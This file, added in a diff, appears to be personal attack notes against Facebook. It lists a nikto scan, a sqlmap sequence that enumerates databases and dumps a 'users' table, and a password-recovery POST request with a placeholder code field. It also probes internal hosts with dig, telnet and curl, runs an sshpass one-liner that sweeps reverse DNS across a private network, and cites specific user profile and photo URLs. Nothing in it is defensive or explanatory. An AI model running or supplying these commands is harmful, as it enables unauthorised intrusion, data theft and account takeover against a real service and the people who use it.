@@ -1,0 +1,34 @@
+Wireshark
+http:.request.method == "POST"
+nikto -h facebook.com
+www.facebook.com/search/facebook_id/photos-of/
+https://www.facebook.com/photo.php?fbid=154856932108805&id=100027534982009&set=a.127544321506733&refid=17" 
+https://www.facebook.com/mohon.marem?refid=13&ref=dbl&__tn__=%2Cg
+
+sqlmap -u "http://free.facebook.com/login.php?id=51"
+sqlmap -u "http://free.facebook.com/section.php?id=51" --dbs
+sqlmap -u "http://free.facebook.com/section.php?id=51" --tables -D safecosmetics
+sqlmap -u "http://free.facebook.com/section.php?id=51" --columns -D safecosmetics -T users
+sqlmap -u "http://free.facebook.com/section.php?id=51" --dump -D safecosmetics -T users
+https://www.facebook.com/login/identify?ctx=recover&lwv=110
+
+POST /recover/as/code/ HTTP/1.1
+
+Host: beta.facebook.com
+
+lsd=AVoywo13&n=XXXXX
+
+mbasic.beta.facebook.com
+
+www.facebook.com/ajax/mercury/send_message.php
+www.facebook.com/ajax/mercury/thread_info.php
+
+dig a archibus.thefacebook.com
+telnet archibus.facebook.com 80
+curl http://archibus.thefacebook.com/spaceview_facebook/locator/room.php
+dig a records.fb.com
+telnet records.fb.com 80
+telnet records.fb.com 443
+wget -O- -q http://192.168.41.16
+dig a acme.facebook.com
+./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'for i in $(seq 201 1 255); do for j in $(seq 0 1 255); do echo "192.168.$i.$j:`dig +short ptr $j.$i.168.192.in-addr.arpa`"; done; done' 2>/dev/stdout
